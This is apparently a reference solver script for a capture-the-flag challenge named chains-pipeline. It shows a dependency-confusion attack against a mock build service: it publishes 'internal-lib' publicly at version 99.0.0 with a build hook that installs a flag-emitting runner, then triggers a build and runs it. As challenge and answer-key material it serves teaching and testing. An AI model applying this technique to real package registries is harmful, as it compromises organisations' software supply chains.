#!/usr/bin/env python3
"""Reference solver for chains-pipeline.

Publish internal-lib publicly at a higher version whose build hook installs an
emit-flag runner, build it (dependency confusion), then run the runner.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request


def _post(url, obj):
    req = urllib.request.Request(
        url,
        data=json.dumps(obj).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    _post(
        base + "/publish-public",
        {
            "name": "internal-lib",
            "version": "99.0.0",
            "buildhook": "install-runner:emit-flag",
        },
    )
    _post(base + "/build", {"name": "internal-lib"})
    return _post(base + "/run", {})["output"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
